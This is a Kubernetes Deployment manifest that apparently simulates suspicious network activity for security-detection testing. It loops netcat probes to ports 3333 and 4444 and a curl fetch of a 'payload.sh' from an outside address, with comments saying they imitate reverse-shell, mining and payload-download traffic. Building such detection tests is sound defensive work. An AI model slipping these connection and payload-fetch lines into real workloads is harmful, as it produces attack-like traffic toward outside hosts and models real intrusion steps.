apiVersion: apps/v1
kind: Deployment
metadata:
  name: security-suspicious-network
  labels:
    app: security-suspicious-network
spec:
  replicas: 1
  selector:
    matchLabels:
      app: security-suspicious-network
  template:
    metadata:
      labels:
        app: security-suspicious-network
    spec:
      containers:
      - name: suspicious-network
        image: alpine:latest
        command:
        - /bin/sh
        - -c
        - |
          apk add --no-cache netcat-openbsd curl
          echo "Simulating suspicious network connections..."
          while true; do
            # Simulate reverse shell or crypto mining connections
            echo "Attempting to connect to suspicious port 3333..."
            nc -z -v -w 2 1.1.1.1 3333 || true
            
            echo "Attempting to connect to suspicious port 4444..."
            nc -z -v -w 2 1.1.1.1 4444 || true
            
            # Simulate downloading a payload
            echo "Attempting to download suspicious payload..."
            curl -s --max-time 2 http://1.1.1.1/payload.sh || true
            
            sleep 10
          done
